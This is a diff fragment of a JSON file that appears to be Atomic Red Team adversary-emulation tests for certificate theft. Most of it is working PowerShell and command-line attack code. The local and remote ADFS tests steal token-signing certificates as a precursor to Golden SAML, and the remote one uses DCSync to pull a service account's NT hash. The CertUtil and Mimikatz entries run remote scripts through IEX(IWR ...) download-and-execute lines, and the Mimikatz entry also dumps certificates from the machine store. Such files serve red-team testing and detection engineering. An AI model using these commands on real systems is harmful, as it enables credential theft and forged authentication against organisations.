+                        "description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as Administrator on an ADFS server.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "AADInternals module must be installed.\n",
+                                "prereq_command": "if (Get-Module AADInternals) {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "Install-Module -Name AADInternals -Force\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "Import-Module AADInternals -Force\nExport-AADIntADFSCertificates\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n",
+                            "cleanup_command": "Remove-Item -Path \".\\ADFS_encryption.pfx\" -ErrorAction Ignore\nRemove-Item -Path \".\\ADFS_signing.pfx\" -ErrorAction Ignore\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "ADFS token signing and encryption certificates theft - Remote",
+                        "auto_generated_guid": "cab413d8-9e4a-4b8d-9b84-c985bd73a442",
+                        "description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "adfs_service_account_name": {
+                                "description": "Name of the ADFS service account",
+                                "type": "string",
+                                "default": "adfs_svc"
+                            },
+                            "replication_user": {
+                                "description": "Username with replication rights. It can be the Domain Admin running the script",
+                                "type": "string",
+                                "default": "Administrator"
+                            },
+                            "replication_password": {
+                                "description": "Password of replication_username",
+                                "type": "string",
+                                "default": "ReallyStrongPassword"
+                            },
+                            "adfs_server_name": {
+                                "description": "Name of an ADFS server",
+                                "type": "string",
+                                "default": "sts.contoso.com"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "AADInternals and ActiveDirectory modules must be installed.\n",
+                                "prereq_command": "if ($(Get-Module AADInternals) -or $(Get-Module -ListAvailable -Name ActiveDirectory)) {echo 0} else {echo 1}\n",
+                                "get_prereq_command": "Install-Module -Name AADInternals -Force\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "Import-Module ActiveDirectory -Force \nImport-Module AADInternals -Force | Out-Null\n#Get Configuration\n$dcServerName = (Get-ADDomainController).HostName\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"#{adfs_service_account_name}\"\n$PWord = ConvertTo-SecureString -String \"#{replication_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{replication_user}, $PWord\n# use DCSync to fetch the ADFS service account's NT hash\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server #{adfs_server_name}\n# Get certificates decryption key\n$Configuration = [xml]$ADFSConfig\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\n$base = \"LDAP://CN=$group,$container,$parent\"\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\n$ADSearch.Filter = '(name=CryptoPolicy)'\n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\n$aduser = $ADSearch.FindOne()\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\n$aduser=$ADSearch.FindOne() \n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \n# Get encrypted certificates from configuration and decrypt them\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n",
+                            "cleanup_command": "Remove-Item -Path \".\\ADFS_encryption.pfx\" -ErrorAction Ignore\nRemove-Item -Path \".\\ADFS_signing.pfx\" -ErrorAction Ignore\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "CertUtil ExportPFX",
+                        "auto_generated_guid": "336b25bf-4514-4684-8924-474974f28137",
+                        "description": "The following Atomic test simulates adding a generic non-malicious certificate to the Root certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog. In addition, this Atomic utilizes CertUtil to export the PFX (ExportPFX), similar to what was seen in the Golden SAML attack.\nKeys will look like - \\SystemCertificates\\CA\\Certificates or \\SystemCertificates\\Root\\Certificates\nReference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\nReference: https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "output": {
+                                "description": "file path to export to",
+                                "type": "path",
+                                "default": "c:\\temp\\atomic.pfx"
+                            },
+                            "password": {
+                                "description": "password for cert",
+                                "type": "string",
+                                "default": "password"
+                            }
+                        },
+                        "executor": {
+                            "command": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \ncertutil.exe -p #{password} -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 #{output}\n",
+                            "cleanup_command": "Get-ChildItem -Path Cert:\\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item \n",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Export Root Certificate with Export-PFXCertificate",
+                        "auto_generated_guid": "7617f689-bbd8-44bc-adcd-6f8968897848",
+                        "description": "Creates a Root certificate and exports it with Export-PFXCertificate PowerShell Cmdlet.\nUpon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-PFXCertificate.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "pfx_path": {
+                                "description": "output path of the certificate",
+                                "type": "string",
+                                "default": "$env:Temp\\atomicredteam.pfx"
+                            }
+                        },
+                        "executor": {
+                            "command": "$mypwd = ConvertTo-SecureString -String \"AtomicRedTeam\" -Force -AsPlainText\n$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My\nSet-Location Cert:\\LocalMachine\\My\nGet-ChildItem -Path $cert.Thumbprint | Export-PfxCertificate -FilePath #{pfx_path} -Password $mypwd\n",
+                            "cleanup_command": "try {\n$cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\\LocalMachine\\My\nGet-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\nGet-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n} catch { }\n",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Export Root Certificate with Export-Certificate",
+                        "auto_generated_guid": "78b274f8-acb0-428b-b1f7-7b0d0e73330a",
+                        "description": "Creates a Root certificate and exports it with Export-Certificate PowerShell Cmdlet.\nUpon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-Certificate.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "pfx_path": {
+                                "description": "Path of the certificate",
+                                "type": "path",
+                                "default": "$env:Temp\\AtomicRedTeam.cer"
+                            }
+                        },
+                        "executor": {
+                            "command": "$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My\nSet-Location Cert:\\LocalMachine\\My\nExport-Certificate -Type CERT -Cert  Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath #{pfx_path}\n",
+                            "cleanup_command": "try {\n   $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\\LocalMachine\\My -ErrorAction Ignore\n   Get-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n   Get-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n}\ncatch { }\n",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Export Certificates with Mimikatz",
+                        "auto_generated_guid": "290df60e-4b5d-4a5e-b0c7-dc5348ea0c86",
+                        "description": "The following Atomic test will utilize Mimikatz to extract the certificates from the local system My store. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\nA successful attempt will stdout the certificates and write multiple .pfx and .der files to disk.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "mimikatz_exe": {
+                                "description": "Path of the Mimikatz binary",
+                                "type": "string",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Mimikatz must exist on disk at specified location (#{mimikatz_exe})\n",
+                                "prereq_command": "if (Test-Path \"#{mimikatz_exe}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path \"#{mimikatz_exe}\" | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "\"#{mimikatz_exe}\" \"crypto::certificates /systemstore:local_machine /store:my /export\"  exit\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 16:02:44"
+}
